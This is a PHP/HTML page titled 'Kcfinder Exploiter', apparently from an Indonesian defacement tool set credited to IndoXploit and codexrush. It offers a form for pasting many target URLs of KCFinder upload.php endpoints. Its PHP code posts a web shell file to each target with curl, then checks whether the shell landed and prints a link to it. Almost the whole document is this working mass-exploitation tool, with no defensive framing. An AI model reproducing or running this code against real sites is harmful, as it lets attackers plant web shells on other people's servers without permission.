<html>
<title>Kcfinder Exploiter mod by - codexrush</title>
<link href="https://fonts.googleapis.com/css?family=Metal Mania|Ceviche+One|Nosifer|Iceberg|Rancho|Iceland|Nova+Mono|Libre+Barcode+39+Extended+Text" rel="stylesheet" type="text/css"> 
<style type="text/css">
body {
         background-color:#000000;
         color: red; 
         font-size: 25px;
         font-family: 'Iceberg', Courier, monospace; 
         margin: 30px auto;
        }
        html {
        	       text-align: center;
        }
a {
	text-decoration: none;
	color: white;
}
textarea {
width: 180px;
height: 90px;
background: black;
    text-align: center;
    border: 2px solid red;
    border-radius: 10px;
    color: #ffffff;
    padding: 10px;
}
 .header {
    background: black;
    border: 2px solid red;
    border-radius: 10px;
    padding: 10px;
    }
.menu {
    background: black;
    text-align: center;
    border: 2px solid red;
    border-radius: 10px;
    color: #ff0000;
    padding: 10px;
}
x {
          color: white;
          text-decoration: none;
          font-size: 40px;
          font-family: iceberg;
          text-shadow: 1px 1px 14px red;
          }
</style>
<div class="menu">
	<x>KCFINDER EXPLOITER</x>
	</div><br>
	<div class="menu">
<form method="post">
<textarea name="target" placeholder="http://www.target.com/[path]/kcfinder/upload.php" style="width: 600px; height: 250px; margin: 5px auto; resize: none;"></textarea><br>
<input type="submit" name="x" style="width: 150px; height: 25px; margin: 5px;" value="Exploit"
</form>
</html>
<?php
# IndoXploit
function ngirim($url) {
$ch = curl_init($url);
	  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
	  curl_setopt($ch, CURLOPT_POST, 1);
	  curl_setopt($ch, CURLOPT_POSTFIELDS, array("Filedata" => "@shellmu.php.ndsxf"));
$data = curl_exec ($ch);
return $data;
}
$target = explode("\r\n", $_POST['target']);
if($_POST['x']) {
	foreach($target as $korban) {
		$upload = ngirim($korban);
		if($upload) {
			$shell = str_replace("upload.php", "upload/", $korban);
			$cek_shell = @file_get_contents("$shell/files/shellmu.php.ndsxf");
			echo "[+] $korban [ <font color=green>sukses</font> ]<br>";
			if(preg_match("/kata-kata yang ada di shellmu/", $cek_shell)) {
				echo "[+] <font color=green>Shellmu ada</font> => <a href='$shell/files/ix.php.ndsxf' target='_blank'>$shell/files/ix.php.ndsxf</a><br>";
			} else {
				echo "[-] <font color=red>Shellmu gaada</font><br>";
			}
		} else {
			echo "[-] $korban [ <font color=red>gagal</font> ]<br>";
		}
	}
}
?>
	</div>
	<center>
</font> <font size="2>" font color="#CECECE" face="Georgia">Copyright</font> <font size="2"><script>document.write(new Date().getFullYear())</script> </font><font size="2>" font color="#ffffff" face="Georgia">All rights reserved. codexrush</font></font>
<br><br><br>
<a href="http://tools.codexrush.com"><font color=white> <-- Return to previous page</a></font></center>
</body>
</html>